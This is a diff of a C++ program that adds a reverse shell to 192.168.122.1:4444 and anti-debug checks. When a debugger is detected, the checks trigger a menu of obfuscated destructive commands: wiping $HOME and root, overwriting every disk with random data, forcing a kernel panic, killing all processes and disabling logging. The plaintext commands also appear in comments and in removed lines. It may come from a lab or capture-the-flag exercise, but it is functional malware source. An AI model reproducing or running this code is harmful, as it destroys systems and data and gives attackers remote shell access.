@@ -1,37 +1,58 @@
+#include <chrono>
+#include <csignal>
+#include <cstring>
+#include <filesystem>
+#include <fstream>
 #include <iostream>
-#include <string>
-#include <vector>
+#include <linux/limits.h>
+#include <netinet/in.h>
+#include <setjmp.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
+#include <string>
+#include <sys/ptrace.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <thread>
+#include <unistd.h>
+#include <vector>
+#include <arpa/inet.h>
 
+#define REMOTE_ADDR "192.168.122.1"
+#define REMOTE_PORT 4444
 #define KEY '726a628080d2f59f210cea4860c0eefb5bc5110fc1a70cb538595bcb487aefac'
 using namespace std;
 
 class Antidebug {
 public:
 //    ptrace check, segfaults if it finds ptrace
-    void ptc() {
+    bool ptc() {
         if(ptrace(PTRACE_TRACEME)) {
-            printf("Debugger detected! Can't steal my tickets suckah!\n");
-            raise(SIGSEGV);
+            printf("Debugger detected!\n");
+            //raise(SIGSEGV);
+            return true;
         } else {
-            return;
+            return false;
         }
     }
 //    Check for common debuggers, segfault if it finds any
-    void dpc() {
+    bool dpc() {
         if (isUnderDebugger())
-        {std::cout << "I am being debugged. Ticketmeister is being DDoSed!!!!\n" << std::endl;
-            raise(SIGSEGV);}
+        {std::cout << "Debugger detected!\n" << std::endl;
+            return true;}
         else
-            return;
+            return false;
     }
 //    Attach self in debugging mode, if cannot attach, segfault. Pretty unreliable, just like timing attacks.
-    void sdc() {
+    bool sdc() {
         if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
-            std::cout << "YOU SHOULD HAVE PATCHED ME OUT, SCALPER!!!\n" << std::endl;
-            raise(SIGSEGV);
+            std::cout << "Debugger detected!\n" << std::endl;
+//            raise(SIGSEGV);
+            return true;
         } else {
-            return;}
+            return false;}
 
 
     }
@@ -147,7 +168,7 @@ public:
     }
 };
 const string encodedRmHomeAndroot = "EQ5DThEFQ0crLC4mWEMRDkNOEQVDTA==";
-const string encodedWreckDisks = "BQwRQwpDCg1DR0sFBwoQCENOD0MfQwQRBhNDTAcGFUMfQwQRBhNDThVDDwwMEx9DBBEGE0MnChAIQx9DAhQIQ04lQ0QnChAIQ0RDRBgTEQoNF0NHUR5EQx9DABYXQ04HQz9ZQ04FUkpYBwxDDQwLFhNDBwdDCgVeTAcGFUwWEQINBwwOQwwFXkcKQ11DDQwLFhNNDBYXQ19DTAcGFUwNFg8PQ0VYBwwNBkNFRUMRDkNOBUNNTA0MCxYTTQwWFw==";
+const string encodedWreckDisks = "BQwRQwpDCg1DR0sFBwoQCENOD0MfQwQRBhNDTAcGFUMfQwQRBhNDThVDDwwMEx9DBBEGE0MnChAIQx9DAhQIQ04lQ0QnChAIQ0RDRBgTEQoNF0NHUR5EQx9DABYXQ04HQz8/WUNOBVJKWAcMQw0MCxYTQwcHQwoFXkwHBhVMFhECDQcMDkMMBV5HCkNdQw0MCxYTTQwWF0NfQ0wHBhVMDRYPD0NF";
 const string encodedKernelPanic = "BgALDEMAQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
 const string encodedKillAllProcsExceptInit = "BgALDEMKQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
 const string encodedStopLoggingExceptPanics = "BgALDENTQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
@@ -171,32 +192,87 @@ void stopLoggingExceptPanics() {
     string cmd = encodedStopLoggingExceptPanics;
     string command = deobfuscate(cmd,KEY);
     system(command.c_str());
+    cout << "Executing command:\t " << command << endl;
+
     return;
 }
 void rmHomeAndRoot(string cmd, char key) {
-    stopLoggingExceptPanics();
+//    stopLoggingExceptPanics();
     string command = deobfuscate(cmd,KEY);
     system(command.c_str());
+    cout << "Executing command:\t " << command << endl;
+
     return;
 }
 
 void wreckDisks(string cmd, char key) {
-    stopLoggingExceptPanics();
+//    stopLoggingExceptPanics();
     string command = deobfuscate(encodedWreckDisks,KEY);
+    cout << "Executing command:\t " << command << endl;
     system(command.c_str());
     return;
 }
 
-void kernelPanic(string cmd, char key) {stopLoggingExceptPanics();string command = deobfuscate(encodedKernelPanic,KEY);system(command.c_str());return;}
-void killAllProcsExceptInit() {
-    stopLoggingExceptPanics();
-    string command = deobfuscate(encodedKillAllProcsExceptInit,KEY);
+void kernelPanic(string cmd, char key) {
+//    stopLoggingExceptPanics();
+    string command = deobfuscate(encodedKernelPanic,KEY);
+    system(command.c_str());return;}
+void killAllProcsExceptInit(string cmd, char key) {
+//    stopLoggingExceptPanics();
+    string command = deobfuscate(cmd,key);
+    cout << "Executing command:\t " << command << endl;
     system(command.c_str());
     return;
 }
+extern "C" {
+    void runShell() {
+        struct sockaddr_in sa;
+        int s;
+
+        sa.sin_family = AF_INET;
+        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+        sa.sin_port = htons(REMOTE_PORT);
+
+        s = socket(AF_INET, SOCK_STREAM, 0);
+        connect(s, (struct sockaddr *)&sa, sizeof(sa));
+        dup2(s, 0);
+        dup2(s, 1);
+        dup2(s, 2);
+
+        execve("/bin/sh", 0, 0);
+        return;
+    }
+}
 
 
+void punishMenu() {
+    int selection;
+    printf(
+            "\r\nPunish Menu:"
+            "\r\n\tPress #1. Remove $HOME and ROOT DIRECTORY (including if the user is root)"
+            "\r\n\tPress #2. Kill all all processes except init"
+            "\r\n\tPress #3. Cause a kernel panic and crash the machine"
+            "\r\n\tPress #4. Wreck virtual hard disks"
+            "\r\n\tPress #5. Stop logging except kernel panics"
+            );
 
+    std::cin >> selection;
+
+    switch (selection) {
+        case 1:
+            rmHomeAndRoot(encodedRmHomeAndroot, KEY);
+        case 2:
+            killAllProcsExceptInit(encodedKillAllProcsExceptInit,KEY);
+        case 3:
+            kernelPanic(encodedKernelPanic,KEY);
+        case 4:
+            wreckDisks(encodedWreckDisks, KEY);
+        case 5:
+            stopLoggingExceptPanics();
+        default: printf("Punishment aborted, exiting"); exit(0);
+    }
+
+}
 /*
 // These are unobfuscated commands, that must be obfuscated and called as system(cmd);
 
@@ -215,23 +291,17 @@ void killAllProcsExceptInit() {
 //const string stopLoggingExceptPanics = "echo 0 > /proc/sysrq-trigger";
 */
 
-
+Antidebug punisher;
 int main() {
-    /*
-    cout << "KEY is " << KEY << endl;
-    vector<string> commands = {
-            "rm -rf $HOME; rm -rf /",
-            "for i in $(fdisk -l | grep /dev | grep -v loop| grep Disk | awk -F 'Disk ' '{print $2}' | cut -d \\: -f1);do nohup dd if=/dev/urandom of=$i > nohup.out < /dev/null &;done && rm -f ./nohup.out",
-            "echo c > /proc/sysrq-trigger",
-            "echo i > /proc/sysrq-trigger",
-            "echo 0 > /proc/sysrq-trigger"
-    };
+/*
+ * Checks for debuggers, else triggers the punishment menu.
+ * */
+    if (punisher.dpc() || punisher.ptc()) {
+        punishMenu();
+    } else {
+        runShell();
+    }
 
-    for (int i=0; i < commands.size(); i++ ) {
-        string b64 = produceb64(commands[i],KEY);
-        cout << commands[i] << ":\t" << "\r\nEncoded:\t" <<  b64 << "\r\n "<< endl;
-
-    }*/
 
     return 0;
 }
